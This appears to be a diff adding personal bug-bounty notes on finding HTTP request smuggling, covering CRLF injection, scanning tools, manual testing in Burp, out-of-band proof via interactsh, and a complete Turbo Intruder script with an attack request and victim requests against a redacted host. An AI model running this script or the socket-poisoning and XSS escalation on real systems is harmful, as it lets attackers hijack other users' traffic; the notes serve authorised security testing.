@@ -1,0 +1,81 @@
+OF course first, we need to find targets really any website could be vulnerable so maybe just gather all possible domains associated with the program were on.
+
+** always look for CRLF injection. This can be a great way to bypass frontend/ reverse proxy checks. Any endpoint where we achieve this should be tested heavily. Run CRLFsuite to check for this. This should be done on as many endpoints as possible. If we get CRLF injection we can essentially smuggle headers directly to the backend thus making request smuggling much more potentially possible. Many oldish servers/proxies have CVEs issued for CRLF** 
+
+** Request smuggling is a server specific issue. So for example often if 2 domains are on the same server and 1 isn't vulnerable the other one wont be vulnerable. BUT server configurations are often very weird. It is VERY possible for 2 different endpoints on the same domain to have different configurations leading to 1 being vulnerable but the other not. 
+
+1. Begin to scan the endpoints. 
+
+- smuggler.py is really nice because it can take a list of domains. It is also not very comprehensive. Still we should feed this a large list of domains to get a baseline for Http 1.1 smuggling. 
+
+- h2csmuggler also looks interesting, it specifically focuses on smuggling traffic past reverse proxies by establishing HTTP/2 cleartext communication w/ H2c backend servers. This tool recommends testing each directory of our target because certain endpoints may foward h2c upgrade headers and others will not. I think the best approach would be to copy burp output and maybe manually "trim" it down to cover unique directories. 
+
+- http2smugl This seems to be an extremely in-depth and useful tool. There is a lot to it so check out the GitHub for more info: https://github.com/neex/http2smugl
+
+- of course the http request smuggler bapp by james kettle should be ran while in burp. Try to get this on as many domains as we can while in burp. This is the most comprehensive all-in-check. 
+
+
+2. Manual Testing:
+
+** BE SURE TO HAVE the "Connection: keep-alive" header in our request!! turn off content length updates AND  normalize http1 line endings when testing in repeater**
+
+- Even if the scanners dont pick anything up we should still be testing this on some domains. Note this is a SERVER ISSUE. If two domains are on the same server and 1 isn't vulnerable then the other wont be either. Be smart while testing and only test certain servers. 
+
+- have notes pulled up while testing. There are so many approaches that we need to consider. We will also be creating a comprehensive list of obfuscations and methods we can try out while testing. The possibilities are really endless with this. 
+
+
+POC/Testing Strategy:
+
+For testing tools we have 2 options. 1. use repeater to group the 2 tabs that point to the same domain then send the group in a single connection. 2. Use turbo intruder to spam a bunch of requests. Try it out with repeater first but we should always be running turbo intruder. **Look up bug bounty reports for specific intruder scripts if having trouble. All turbo intruder scripts for this should use 1 connection ONLY** good turbo script found here: 
+
+https://infosecwriteups.com/get-paid-by-smuggling-the-legal-way-c31805de3c59
+
+Spin-up interactsh-client while during manual testing. OOB connections are a great way to prove a vuln. All we have to do is smuggle a request with our server in the host header (should appear to be a 404 from the target site). We could also try to access a 403 page to prove the impact. Could also try to access the site from phone cell service(not wifi) to confirm we have poisoned the socket. Be sure to also look for reflections in the response. Often the smuggled host header will be reflected everywhere resulting in XSS with no user interaction... a good way to escalate impact.
+
+
+Wonderful turbo intruder script for request smuggling. Note that it includes the attack and victim requests. Also note there was a CRLF used in the attacker request. This just uses the \n instead of the full \r\n thus creating a discrepancy and enabling smuggling. If the target isn't vulnerable to this specific CRLF well have to remove it. Still, use this script!!! 
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint='https://██████████:443',
+                           concurrentConnections=5,
+                           requestsPerConnection=1,
+                           pipeline=False,
+                           maxRetriesPerRequest=0
+                           )
+    engine.start()    
+
+    attack = '''POST /████ HTTP/1.1
+Fooz: bar\nTransfer-Encoding: chunked
+Host: stage.█████
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 77
+Foo: bar
+
+0
+
+GET███████ HTTP/1.1
+X: X'''
+
+    engine.queue(attack)
+
+    victim = '''GET /foo.jpg?x=%s HTTP/1.1
+Host: stage.████████
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: keep-alive
+
+'''
+    for i in range(15):
+        engine.queue(victim, i)
+        time.sleep(0.2)
+
+
+def handleResponse(req, interesting):
+    table.add(req)
